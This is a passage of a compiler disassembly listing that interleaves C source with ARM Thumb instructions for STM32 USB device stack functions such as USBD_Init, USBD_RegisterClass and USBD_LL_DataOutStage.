 800afaa:	46bd      	mov	sp, r7
 800afac:	bd90      	pop	{r4, r7, pc}
 800afae:	bf00      	nop
 800afb0:	2000010b 	.word	0x2000010b

0800afb4 <SCSI_UpdateBotData>:
  * @param  length: Data length
  * @retval status
  */
static int8_t SCSI_UpdateBotData(USBD_MSC_BOT_HandleTypeDef *hmsc,
                                 uint8_t *pBuff, uint16_t length)
{
 800afb4:	b480      	push	{r7}
 800afb6:	b087      	sub	sp, #28
 800afb8:	af00      	add	r7, sp, #0
 800afba:	60f8      	str	r0, [r7, #12]
 800afbc:	60b9      	str	r1, [r7, #8]
 800afbe:	4613      	mov	r3, r2
 800afc0:	80fb      	strh	r3, [r7, #6]
  uint16_t len = length;
 800afc2:	88fb      	ldrh	r3, [r7, #6]
 800afc4:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800afc6:	68fb      	ldr	r3, [r7, #12]
 800afc8:	2b00      	cmp	r3, #0
 800afca:	d102      	bne.n	800afd2 <SCSI_UpdateBotData+0x1e>
  {
    return -1;
 800afcc:	f04f 33ff 	mov.w	r3, #4294967295
 800afd0:	e013      	b.n	800affa <SCSI_UpdateBotData+0x46>
  }

  hmsc->bot_data_length = len;
 800afd2:	8afa      	ldrh	r2, [r7, #22]
 800afd4:	68fb      	ldr	r3, [r7, #12]
 800afd6:	60da      	str	r2, [r3, #12]

  while (len != 0U)
 800afd8:	e00b      	b.n	800aff2 <SCSI_UpdateBotData+0x3e>
  {
    len--;
 800afda:	8afb      	ldrh	r3, [r7, #22]
 800afdc:	3b01      	subs	r3, #1
 800afde:	82fb      	strh	r3, [r7, #22]
    hmsc->bot_data[len] = pBuff[len];
 800afe0:	8afb      	ldrh	r3, [r7, #22]
 800afe2:	68ba      	ldr	r2, [r7, #8]
 800afe4:	441a      	add	r2, r3
 800afe6:	8afb      	ldrh	r3, [r7, #22]
 800afe8:	7811      	ldrb	r1, [r2, #0]
 800afea:	68fa      	ldr	r2, [r7, #12]
 800afec:	4413      	add	r3, r2
 800afee:	460a      	mov	r2, r1
 800aff0:	741a      	strb	r2, [r3, #16]
  while (len != 0U)
 800aff2:	8afb      	ldrh	r3, [r7, #22]
 800aff4:	2b00      	cmp	r3, #0
 800aff6:	d1f0      	bne.n	800afda <SCSI_UpdateBotData+0x26>
  }

  return 0;
 800aff8:	2300      	movs	r3, #0
}
 800affa:	4618      	mov	r0, r3
 800affc:	371c      	adds	r7, #28
 800affe:	46bd      	mov	sp, r7
 800b000:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b004:	4770      	bx	lr

0800b006 <USBD_Init>:
  * @param  id: Low level core index
  * @retval None
  */
USBD_StatusTypeDef USBD_Init(USBD_HandleTypeDef *pdev,
                             USBD_DescriptorsTypeDef *pdesc, uint8_t id)
{
 800b006:	b580      	push	{r7, lr}
 800b008:	b086      	sub	sp, #24
 800b00a:	af00      	add	r7, sp, #0
 800b00c:	60f8      	str	r0, [r7, #12]
 800b00e:	60b9      	str	r1, [r7, #8]
 800b010:	4613      	mov	r3, r2
 800b012:	71fb      	strb	r3, [r7, #7]
  USBD_StatusTypeDef ret;

  /* Check whether the USB Host handle is valid */
  if (pdev == NULL)
 800b014:	68fb      	ldr	r3, [r7, #12]
 800b016:	2b00      	cmp	r3, #0
 800b018:	d101      	bne.n	800b01e <USBD_Init+0x18>
  {
#if (USBD_DEBUG_LEVEL > 1U)
    USBD_ErrLog("Invalid Device handle");
#endif /* (USBD_DEBUG_LEVEL > 1U) */
    return USBD_FAIL;
 800b01a:	2303      	movs	r3, #3
 800b01c:	e01f      	b.n	800b05e <USBD_Init+0x58>
    pdev->NumClasses = 0;
    pdev->classId = 0;
  }
#else
  /* Unlink previous class*/
  pdev->pClass[0] = NULL;
 800b01e:	68fb      	ldr	r3, [r7, #12]
 800b020:	2200      	movs	r2, #0
 800b022:	f8c3 22b8 	str.w	r2, [r3, #696]	; 0x2b8
  pdev->pUserData[0] = NULL;
 800b026:	68fb      	ldr	r3, [r7, #12]
 800b028:	2200      	movs	r2, #0
 800b02a:	f8c3 22c4 	str.w	r2, [r3, #708]	; 0x2c4
#endif /* USE_USBD_COMPOSITE */

  pdev->pConfDesc = NULL;
 800b02e:	68fb      	ldr	r3, [r7, #12]
 800b030:	2200      	movs	r2, #0
 800b032:	f8c3 22d0 	str.w	r2, [r3, #720]	; 0x2d0

  /* Assign USBD Descriptors */
  if (pdesc != NULL)
 800b036:	68bb      	ldr	r3, [r7, #8]
 800b038:	2b00      	cmp	r3, #0
 800b03a:	d003      	beq.n	800b044 <USBD_Init+0x3e>
  {
    pdev->pDesc = pdesc;
 800b03c:	68fb      	ldr	r3, [r7, #12]
 800b03e:	68ba      	ldr	r2, [r7, #8]
 800b040:	f8c3 22b4 	str.w	r2, [r3, #692]	; 0x2b4
  }

  /* Set Device initial State */
  pdev->dev_state = USBD_STATE_DEFAULT;
 800b044:	68fb      	ldr	r3, [r7, #12]
 800b046:	2201      	movs	r2, #1
 800b048:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  pdev->id = id;
 800b04c:	68fb      	ldr	r3, [r7, #12]
 800b04e:	79fa      	ldrb	r2, [r7, #7]
 800b050:	701a      	strb	r2, [r3, #0]

  /* Initialize low level driver */
  ret = USBD_LL_Init(pdev);
 800b052:	68f8      	ldr	r0, [r7, #12]
 800b054:	f001 fdb6 	bl	800cbc4 <USBD_LL_Init>
 800b058:	4603      	mov	r3, r0
 800b05a:	75fb      	strb	r3, [r7, #23]

  return ret;
 800b05c:	7dfb      	ldrb	r3, [r7, #23]
}
 800b05e:	4618      	mov	r0, r3
 800b060:	3718      	adds	r7, #24
 800b062:	46bd      	mov	sp, r7
 800b064:	bd80      	pop	{r7, pc}

0800b066 <USBD_RegisterClass>:
  * @param  pDevice : Device Handle
  * @param  pclass: Class handle
  * @retval USBD Status
  */
USBD_StatusTypeDef USBD_RegisterClass(USBD_HandleTypeDef *pdev, USBD_ClassTypeDef *pclass)
{
 800b066:	b580      	push	{r7, lr}
 800b068:	b084      	sub	sp, #16
 800b06a:	af00      	add	r7, sp, #0
 800b06c:	6078      	str	r0, [r7, #4]
 800b06e:	6039      	str	r1, [r7, #0]
  uint16_t len = 0U;
 800b070:	2300      	movs	r3, #0
 800b072:	81fb      	strh	r3, [r7, #14]

  if (pclass == NULL)
 800b074:	683b      	ldr	r3, [r7, #0]
 800b076:	2b00      	cmp	r3, #0
 800b078:	d101      	bne.n	800b07e <USBD_RegisterClass+0x18>
  {
#if (USBD_DEBUG_LEVEL > 1U)
    USBD_ErrLog("Invalid Class handle");
#endif /* (USBD_DEBUG_LEVEL > 1U) */
    return USBD_FAIL;
 800b07a:	2303      	movs	r3, #3
 800b07c:	e025      	b.n	800b0ca <USBD_RegisterClass+0x64>
  }

  /* link the class to the USB Device handle */
  pdev->pClass[0] = pclass;
 800b07e:	687b      	ldr	r3, [r7, #4]
 800b080:	683a      	ldr	r2, [r7, #0]
 800b082:	f8c3 22b8 	str.w	r2, [r3, #696]	; 0x2b8
  if (pdev->pClass[pdev->classId]->GetHSConfigDescriptor != NULL)
  {
    pdev->pConfDesc = (void *)pdev->pClass[pdev->classId]->GetHSConfigDescriptor(&len);
  }
#else /* Default USE_USB_FS */
  if (pdev->pClass[pdev->classId]->GetFSConfigDescriptor != NULL)
 800b086:	687b      	ldr	r3, [r7, #4]
 800b088:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800b08c:	687b      	ldr	r3, [r7, #4]
 800b08e:	32ae      	adds	r2, #174	; 0xae
 800b090:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b094:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800b096:	2b00      	cmp	r3, #0
 800b098:	d00f      	beq.n	800b0ba <USBD_RegisterClass+0x54>
  {
    pdev->pConfDesc = (void *)pdev->pClass[pdev->classId]->GetFSConfigDescriptor(&len);
 800b09a:	687b      	ldr	r3, [r7, #4]
 800b09c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800b0a0:	687b      	ldr	r3, [r7, #4]
 800b0a2:	32ae      	adds	r2, #174	; 0xae
 800b0a4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b0a8:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800b0aa:	f107 020e 	add.w	r2, r7, #14
 800b0ae:	4610      	mov	r0, r2
 800b0b0:	4798      	blx	r3
 800b0b2:	4602      	mov	r2, r0
 800b0b4:	687b      	ldr	r3, [r7, #4]
 800b0b6:	f8c3 22d0 	str.w	r2, [r3, #720]	; 0x2d0
  }
#endif /* USE_USB_FS */

  /* Increment the NumClasses */
  pdev->NumClasses ++;
 800b0ba:	687b      	ldr	r3, [r7, #4]
 800b0bc:	f8d3 32d8 	ldr.w	r3, [r3, #728]	; 0x2d8
 800b0c0:	1c5a      	adds	r2, r3, #1
 800b0c2:	687b      	ldr	r3, [r7, #4]
 800b0c4:	f8c3 22d8 	str.w	r2, [r3, #728]	; 0x2d8

  return USBD_OK;
 800b0c8:	2300      	movs	r3, #0
}
 800b0ca:	4618      	mov	r0, r3
 800b0cc:	3710      	adds	r7, #16
 800b0ce:	46bd      	mov	sp, r7
 800b0d0:	bd80      	pop	{r7, pc}

0800b0d2 <USBD_Start>:
  *         Start the USB Device Core.
  * @param  pdev: Device Handle
  * @retval USBD Status
  */
USBD_StatusTypeDef USBD_Start(USBD_HandleTypeDef *pdev)
{
 800b0d2:	b580      	push	{r7, lr}
 800b0d4:	b082      	sub	sp, #8
 800b0d6:	af00      	add	r7, sp, #0
 800b0d8:	6078      	str	r0, [r7, #4]
#ifdef USE_USBD_COMPOSITE
  pdev->classId = 0U;
#endif /* USE_USBD_COMPOSITE */

  /* Start the low level driver  */
  return USBD_LL_Start(pdev);
 800b0da:	6878      	ldr	r0, [r7, #4]
 800b0dc:	f001 fdca 	bl	800cc74 <USBD_LL_Start>
 800b0e0:	4603      	mov	r3, r0
}
 800b0e2:	4618      	mov	r0, r3
 800b0e4:	3708      	adds	r7, #8
 800b0e6:	46bd      	mov	sp, r7
 800b0e8:	bd80      	pop	{r7, pc}

0800b0ea <USBD_RunTestMode>:
  *         Launch test mode process
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_RunTestMode(USBD_HandleTypeDef *pdev)
{
 800b0ea:	b480      	push	{r7}
 800b0ec:	b083      	sub	sp, #12
 800b0ee:	af00      	add	r7, sp, #0
 800b0f0:	6078      	str	r0, [r7, #4]
  return ret;
#else
  /* Prevent unused argument compilation warning */
  UNUSED(pdev);

  return USBD_OK;
 800b0f2:	2300      	movs	r3, #0
#endif /* USBD_HS_TESTMODE_ENABLE */
}
 800b0f4:	4618      	mov	r0, r3
 800b0f6:	370c      	adds	r7, #12
 800b0f8:	46bd      	mov	sp, r7
 800b0fa:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b0fe:	4770      	bx	lr

0800b100 <USBD_SetClassConfig>:
  * @param  cfgidx: configuration index
  * @retval status
  */

USBD_StatusTypeDef USBD_SetClassConfig(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800b100:	b580      	push	{r7, lr}
 800b102:	b084      	sub	sp, #16
 800b104:	af00      	add	r7, sp, #0
 800b106:	6078      	str	r0, [r7, #4]
 800b108:	460b      	mov	r3, r1
 800b10a:	70fb      	strb	r3, [r7, #3]
  USBD_StatusTypeDef ret = USBD_OK;
 800b10c:	2300      	movs	r3, #0
 800b10e:	73fb      	strb	r3, [r7, #15]
        }
      }
    }
  }
#else
  if (pdev->pClass[0] != NULL)
 800b110:	687b      	ldr	r3, [r7, #4]
 800b112:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b116:	2b00      	cmp	r3, #0
 800b118:	d009      	beq.n	800b12e <USBD_SetClassConfig+0x2e>
  {
    /* Set configuration and Start the Class */
    ret = (USBD_StatusTypeDef)pdev->pClass[0]->Init(pdev, cfgidx);
 800b11a:	687b      	ldr	r3, [r7, #4]
 800b11c:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b120:	681b      	ldr	r3, [r3, #0]
 800b122:	78fa      	ldrb	r2, [r7, #3]
 800b124:	4611      	mov	r1, r2
 800b126:	6878      	ldr	r0, [r7, #4]
 800b128:	4798      	blx	r3
 800b12a:	4603      	mov	r3, r0
 800b12c:	73fb      	strb	r3, [r7, #15]
  }
#endif /* USE_USBD_COMPOSITE */

  return ret;
 800b12e:	7bfb      	ldrb	r3, [r7, #15]
}
 800b130:	4618      	mov	r0, r3
 800b132:	3710      	adds	r7, #16
 800b134:	46bd      	mov	sp, r7
 800b136:	bd80      	pop	{r7, pc}

0800b138 <USBD_ClrClassConfig>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status: USBD_StatusTypeDef
  */
USBD_StatusTypeDef USBD_ClrClassConfig(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800b138:	b580      	push	{r7, lr}
 800b13a:	b084      	sub	sp, #16
 800b13c:	af00      	add	r7, sp, #0
 800b13e:	6078      	str	r0, [r7, #4]
 800b140:	460b      	mov	r3, r1
 800b142:	70fb      	strb	r3, [r7, #3]
  USBD_StatusTypeDef ret = USBD_OK;
 800b144:	2300      	movs	r3, #0
 800b146:	73fb      	strb	r3, [r7, #15]
      }
    }
  }
#else
  /* Clear configuration  and De-initialize the Class process */
  if (pdev->pClass[0]->DeInit(pdev, cfgidx) != 0U)
 800b148:	687b      	ldr	r3, [r7, #4]
 800b14a:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b14e:	685b      	ldr	r3, [r3, #4]
 800b150:	78fa      	ldrb	r2, [r7, #3]
 800b152:	4611      	mov	r1, r2
 800b154:	6878      	ldr	r0, [r7, #4]
 800b156:	4798      	blx	r3
 800b158:	4603      	mov	r3, r0
 800b15a:	2b00      	cmp	r3, #0
 800b15c:	d001      	beq.n	800b162 <USBD_ClrClassConfig+0x2a>
  {
    ret = USBD_FAIL;
 800b15e:	2303      	movs	r3, #3
 800b160:	73fb      	strb	r3, [r7, #15]
  }
#endif /* USE_USBD_COMPOSITE */

  return ret;
 800b162:	7bfb      	ldrb	r3, [r7, #15]
}
 800b164:	4618      	mov	r0, r3
 800b166:	3710      	adds	r7, #16
 800b168:	46bd      	mov	sp, r7
 800b16a:	bd80      	pop	{r7, pc}

0800b16c <USBD_LL_SetupStage>:
  *         Handle the setup stage
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_SetupStage(USBD_HandleTypeDef *pdev, uint8_t *psetup)
{
 800b16c:	b580      	push	{r7, lr}
 800b16e:	b084      	sub	sp, #16
 800b170:	af00      	add	r7, sp, #0
 800b172:	6078      	str	r0, [r7, #4]
 800b174:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret;

  USBD_ParseSetupRequest(&pdev->request, psetup);
 800b176:	687b      	ldr	r3, [r7, #4]
 800b178:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b17c:	6839      	ldr	r1, [r7, #0]
 800b17e:	4618      	mov	r0, r3
 800b180:	f001 f8a7 	bl	800c2d2 <USBD_ParseSetupRequest>

  pdev->ep0_state = USBD_EP0_SETUP;
 800b184:	687b      	ldr	r3, [r7, #4]
 800b186:	2201      	movs	r2, #1
 800b188:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  pdev->ep0_data_len = pdev->request.wLength;
 800b18c:	687b      	ldr	r3, [r7, #4]
 800b18e:	f8b3 32b0 	ldrh.w	r3, [r3, #688]	; 0x2b0
 800b192:	461a      	mov	r2, r3
 800b194:	687b      	ldr	r3, [r7, #4]
 800b196:	f8c3 2298 	str.w	r2, [r3, #664]	; 0x298

  switch (pdev->request.bmRequest & 0x1FU)
 800b19a:	687b      	ldr	r3, [r7, #4]
 800b19c:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b1a0:	f003 031f 	and.w	r3, r3, #31
 800b1a4:	2b02      	cmp	r3, #2
 800b1a6:	d01a      	beq.n	800b1de <USBD_LL_SetupStage+0x72>
 800b1a8:	2b02      	cmp	r3, #2
 800b1aa:	d822      	bhi.n	800b1f2 <USBD_LL_SetupStage+0x86>
 800b1ac:	2b00      	cmp	r3, #0
 800b1ae:	d002      	beq.n	800b1b6 <USBD_LL_SetupStage+0x4a>
 800b1b0:	2b01      	cmp	r3, #1
 800b1b2:	d00a      	beq.n	800b1ca <USBD_LL_SetupStage+0x5e>
 800b1b4:	e01d      	b.n	800b1f2 <USBD_LL_SetupStage+0x86>
  {
    case USB_REQ_RECIPIENT_DEVICE:
      ret = USBD_StdDevReq(pdev, &pdev->request);
 800b1b6:	687b      	ldr	r3, [r7, #4]
 800b1b8:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b1bc:	4619      	mov	r1, r3
 800b1be:	6878      	ldr	r0, [r7, #4]
 800b1c0:	f000 fad4 	bl	800b76c <USBD_StdDevReq>
 800b1c4:	4603      	mov	r3, r0
 800b1c6:	73fb      	strb	r3, [r7, #15]
      break;
 800b1c8:	e020      	b.n	800b20c <USBD_LL_SetupStage+0xa0>

    case USB_REQ_RECIPIENT_INTERFACE:
      ret = USBD_StdItfReq(pdev, &pdev->request);
 800b1ca:	687b      	ldr	r3, [r7, #4]
 800b1cc:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b1d0:	4619      	mov	r1, r3
 800b1d2:	6878      	ldr	r0, [r7, #4]
 800b1d4:	f000 fb3c 	bl	800b850 <USBD_StdItfReq>
 800b1d8:	4603      	mov	r3, r0
 800b1da:	73fb      	strb	r3, [r7, #15]
      break;
 800b1dc:	e016      	b.n	800b20c <USBD_LL_SetupStage+0xa0>

    case USB_REQ_RECIPIENT_ENDPOINT:
      ret = USBD_StdEPReq(pdev, &pdev->request);
 800b1de:	687b      	ldr	r3, [r7, #4]
 800b1e0:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b1e4:	4619      	mov	r1, r3
 800b1e6:	6878      	ldr	r0, [r7, #4]
 800b1e8:	f000 fb9e 	bl	800b928 <USBD_StdEPReq>
 800b1ec:	4603      	mov	r3, r0
 800b1ee:	73fb      	strb	r3, [r7, #15]
      break;
 800b1f0:	e00c      	b.n	800b20c <USBD_LL_SetupStage+0xa0>

    default:
      ret = USBD_LL_StallEP(pdev, (pdev->request.bmRequest & 0x80U));
 800b1f2:	687b      	ldr	r3, [r7, #4]
 800b1f4:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b1f8:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 800b1fc:	b2db      	uxtb	r3, r3
 800b1fe:	4619      	mov	r1, r3
 800b200:	6878      	ldr	r0, [r7, #4]
 800b202:	f001 fe13 	bl	800ce2c <USBD_LL_StallEP>
 800b206:	4603      	mov	r3, r0
 800b208:	73fb      	strb	r3, [r7, #15]
      break;
 800b20a:	bf00      	nop
  }

  return ret;
 800b20c:	7bfb      	ldrb	r3, [r7, #15]
}
 800b20e:	4618      	mov	r0, r3
 800b210:	3710      	adds	r7, #16
 800b212:	46bd      	mov	sp, r7
 800b214:	bd80      	pop	{r7, pc}

0800b216 <USBD_LL_DataOutStage>:
  * @param  pdata: data pointer
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_DataOutStage(USBD_HandleTypeDef *pdev,
                                        uint8_t epnum, uint8_t *pdata)
{
 800b216:	b580      	push	{r7, lr}
 800b218:	b086      	sub	sp, #24
 800b21a:	af00      	add	r7, sp, #0
 800b21c:	60f8      	str	r0, [r7, #12]
 800b21e:	460b      	mov	r3, r1
 800b220:	607a      	str	r2, [r7, #4]
 800b222:	72fb      	strb	r3, [r7, #11]
  USBD_EndpointTypeDef *pep;
  USBD_StatusTypeDef ret = USBD_OK;
 800b224:	2300      	movs	r3, #0
 800b226:	75fb      	strb	r3, [r7, #23]
  uint8_t idx;

  if (epnum == 0U)
 800b228:	7afb      	ldrb	r3, [r7, #11]
 800b22a:	2b00      	cmp	r3, #0
 800b22c:	d16e      	bne.n	800b30c <USBD_LL_DataOutStage+0xf6>
  {
    pep = &pdev->ep_out[0];
 800b22e:	68fb      	ldr	r3, [r7, #12]
 800b230:	f503 73aa 	add.w	r3, r3, #340	; 0x154
 800b234:	613b      	str	r3, [r7, #16]

    if (pdev->ep0_state == USBD_EP0_DATA_OUT)
 800b236:	68fb      	ldr	r3, [r7, #12]
 800b238:	f8d3 3294 	ldr.w	r3, [r3, #660]	; 0x294
 800b23c:	2b03      	cmp	r3, #3
 800b23e:	f040 8098 	bne.w	800b372 <USBD_LL_DataOutStage+0x15c>
    {
      if (pep->rem_length > pep->maxpacket)
 800b242:	693b      	ldr	r3, [r7, #16]
 800b244:	689a      	ldr	r2, [r3, #8]
 800b246:	693b      	ldr	r3, [r7, #16]
 800b248:	68db      	ldr	r3, [r3, #12]
 800b24a:	429a      	cmp	r2, r3
 800b24c:	d913      	bls.n	800b276 <USBD_LL_DataOutStage+0x60>
      {
        pep->rem_length -= pep->maxpacket;
 800b24e:	693b      	ldr	r3, [r7, #16]
 800b250:	689a      	ldr	r2, [r3, #8]
 800b252:	693b      	ldr	r3, [r7, #16]
 800b254:	68db      	ldr	r3, [r3, #12]
 800b256:	1ad2      	subs	r2, r2, r3
 800b258:	693b      	ldr	r3, [r7, #16]
 800b25a:	609a      	str	r2, [r3, #8]

        (void)USBD_CtlContinueRx(pdev, pdata, MIN(pep->rem_length, pep->maxpacket));
 800b25c:	693b      	ldr	r3, [r7, #16]
 800b25e:	68da      	ldr	r2, [r3, #12]
 800b260:	693b      	ldr	r3, [r7, #16]
 800b262:	689b      	ldr	r3, [r3, #8]
 800b264:	4293      	cmp	r3, r2
 800b266:	bf28      	it	cs
 800b268:	4613      	movcs	r3, r2
 800b26a:	461a      	mov	r2, r3
 800b26c:	6879      	ldr	r1, [r7, #4]
 800b26e:	68f8      	ldr	r0, [r7, #12]
 800b270:	f001 f923 	bl	800c4ba <USBD_CtlContinueRx>
 800b274:	e07d      	b.n	800b372 <USBD_LL_DataOutStage+0x15c>
      }
      else
      {
        /* Find the class ID relative to the current request */
        switch (pdev->request.bmRequest & 0x1FU)
 800b276:	68fb      	ldr	r3, [r7, #12]
 800b278:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b27c:	f003 031f 	and.w	r3, r3, #31
 800b280:	2b02      	cmp	r3, #2
 800b282:	d014      	beq.n	800b2ae <USBD_LL_DataOutStage+0x98>
 800b284:	2b02      	cmp	r3, #2
 800b286:	d81d      	bhi.n	800b2c4 <USBD_LL_DataOutStage+0xae>
 800b288:	2b00      	cmp	r3, #0
 800b28a:	d002      	beq.n	800b292 <USBD_LL_DataOutStage+0x7c>
 800b28c:	2b01      	cmp	r3, #1
 800b28e:	d003      	beq.n	800b298 <USBD_LL_DataOutStage+0x82>
 800b290:	e018      	b.n	800b2c4 <USBD_LL_DataOutStage+0xae>
        {
          case USB_REQ_RECIPIENT_DEVICE:
            /* Device requests must be managed by the first instantiated class
               (or duplicated by all classes for simplicity) */
            idx = 0U;
 800b292:	2300      	movs	r3, #0
 800b294:	75bb      	strb	r3, [r7, #22]
            break;
 800b296:	e018      	b.n	800b2ca <USBD_LL_DataOutStage+0xb4>

          case USB_REQ_RECIPIENT_INTERFACE:
            idx = USBD_CoreFindIF(pdev, LOBYTE(pdev->request.wIndex));
 800b298:	68fb      	ldr	r3, [r7, #12]
 800b29a:	f8b3 32ae 	ldrh.w	r3, [r3, #686]	; 0x2ae
 800b29e:	b2db      	uxtb	r3, r3
 800b2a0:	4619      	mov	r1, r3
 800b2a2:	68f8      	ldr	r0, [r7, #12]
 800b2a4:	f000 f9d2 	bl	800b64c <USBD_CoreFindIF>
 800b2a8:	4603      	mov	r3, r0
 800b2aa:	75bb      	strb	r3, [r7, #22]
            break;
 800b2ac:	e00d      	b.n	800b2ca <USBD_LL_DataOutStage+0xb4>

          case USB_REQ_RECIPIENT_ENDPOINT:
            idx = USBD_CoreFindEP(pdev, LOBYTE(pdev->request.wIndex));
 800b2ae:	68fb      	ldr	r3, [r7, #12]
 800b2b0:	f8b3 32ae 	ldrh.w	r3, [r3, #686]	; 0x2ae
 800b2b4:	b2db      	uxtb	r3, r3
 800b2b6:	4619      	mov	r1, r3
 800b2b8:	68f8      	ldr	r0, [r7, #12]
 800b2ba:	f000 f9d4 	bl	800b666 <USBD_CoreFindEP>
 800b2be:	4603      	mov	r3, r0
 800b2c0:	75bb      	strb	r3, [r7, #22]
            break;
 800b2c2:	e002      	b.n	800b2ca <USBD_LL_DataOutStage+0xb4>

          default:
            /* Back to the first class in case of doubt */
            idx = 0U;
 800b2c4:	2300      	movs	r3, #0
 800b2c6:	75bb      	strb	r3, [r7, #22]
            break;
 800b2c8:	bf00      	nop
        }

        if (idx < USBD_MAX_SUPPORTED_CLASS)
 800b2ca:	7dbb      	ldrb	r3, [r7, #22]
 800b2cc:	2b00      	cmp	r3, #0
 800b2ce:	d119      	bne.n	800b304 <USBD_LL_DataOutStage+0xee>
        {
          /* Setup the class ID and route the request to the relative class function */
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b2d0:	68fb      	ldr	r3, [r7, #12]
 800b2d2:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b2d6:	b2db      	uxtb	r3, r3
 800b2d8:	2b03      	cmp	r3, #3
 800b2da:	d113      	bne.n	800b304 <USBD_LL_DataOutStage+0xee>
          {
            if (pdev->pClass[idx]->EP0_RxReady != NULL)
 800b2dc:	7dba      	ldrb	r2, [r7, #22]
 800b2de:	68fb      	ldr	r3, [r7, #12]
 800b2e0:	32ae      	adds	r2, #174	; 0xae
 800b2e2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b2e6:	691b      	ldr	r3, [r3, #16]
 800b2e8:	2b00      	cmp	r3, #0
 800b2ea:	d00b      	beq.n	800b304 <USBD_LL_DataOutStage+0xee>
            {
              pdev->classId = idx;
 800b2ec:	7dba      	ldrb	r2, [r7, #22]
 800b2ee:	68fb      	ldr	r3, [r7, #12]
 800b2f0:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
              pdev->pClass[idx]->EP0_RxReady(pdev);
 800b2f4:	7dba      	ldrb	r2, [r7, #22]
 800b2f6:	68fb      	ldr	r3, [r7, #12]
 800b2f8:	32ae      	adds	r2, #174	; 0xae
 800b2fa:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b2fe:	691b      	ldr	r3, [r3, #16]
 800b300:	68f8      	ldr	r0, [r7, #12]
 800b302:	4798      	blx	r3
            }
          }
        }

        (void)USBD_CtlSendStatus(pdev);
 800b304:	68f8      	ldr	r0, [r7, #12]
 800b306:	f001 f8e9 	bl	800c4dc <USBD_CtlSendStatus>
 800b30a:	e032      	b.n	800b372 <USBD_LL_DataOutStage+0x15c>
    }
  }
  else
  {
    /* Get the class index relative to this interface */
    idx = USBD_CoreFindEP(pdev, (epnum & 0x7FU));
 800b30c:	7afb      	ldrb	r3, [r7, #11]
 800b30e:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800b312:	b2db      	uxtb	r3, r3
 800b314:	4619      	mov	r1, r3
 800b316:	68f8      	ldr	r0, [r7, #12]
 800b318:	f000 f9a5 	bl	800b666 <USBD_CoreFindEP>
 800b31c:	4603      	mov	r3, r0
 800b31e:	75bb      	strb	r3, [r7, #22]

    if (((uint16_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b320:	7dbb      	ldrb	r3, [r7, #22]
 800b322:	2bff      	cmp	r3, #255	; 0xff
 800b324:	d025      	beq.n	800b372 <USBD_LL_DataOutStage+0x15c>
 800b326:	7dbb      	ldrb	r3, [r7, #22]
 800b328:	2b00      	cmp	r3, #0
 800b32a:	d122      	bne.n	800b372 <USBD_LL_DataOutStage+0x15c>
    {
      /* Call the class data out function to manage the request */
      if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b32c:	68fb      	ldr	r3, [r7, #12]
 800b32e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b332:	b2db      	uxtb	r3, r3
 800b334:	2b03      	cmp	r3, #3
 800b336:	d117      	bne.n	800b368 <USBD_LL_DataOutStage+0x152>
      {
        if (pdev->pClass[idx]->DataOut != NULL)
 800b338:	7dba      	ldrb	r2, [r7, #22]
 800b33a:	68fb      	ldr	r3, [r7, #12]
 800b33c:	32ae      	adds	r2, #174	; 0xae
 800b33e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b342:	699b      	ldr	r3, [r3, #24]
 800b344:	2b00      	cmp	r3, #0
 800b346:	d00f      	beq.n	800b368 <USBD_LL_DataOutStage+0x152>
        {
          pdev->classId = idx;
 800b348:	7dba      	ldrb	r2, [r7, #22]
 800b34a:	68fb      	ldr	r3, [r7, #12]
 800b34c:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->DataOut(pdev, epnum);
 800b350:	7dba      	ldrb	r2, [r7, #22]
 800b352:	68fb      	ldr	r3, [r7, #12]
 800b354:	32ae      	adds	r2, #174	; 0xae
 800b356:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b35a:	699b      	ldr	r3, [r3, #24]
 800b35c:	7afa      	ldrb	r2, [r7, #11]
 800b35e:	4611      	mov	r1, r2
 800b360:	68f8      	ldr	r0, [r7, #12]
 800b362:	4798      	blx	r3
 800b364:	4603      	mov	r3, r0
 800b366:	75fb      	strb	r3, [r7, #23]
        }
      }
      if (ret != USBD_OK)
 800b368:	7dfb      	ldrb	r3, [r7, #23]
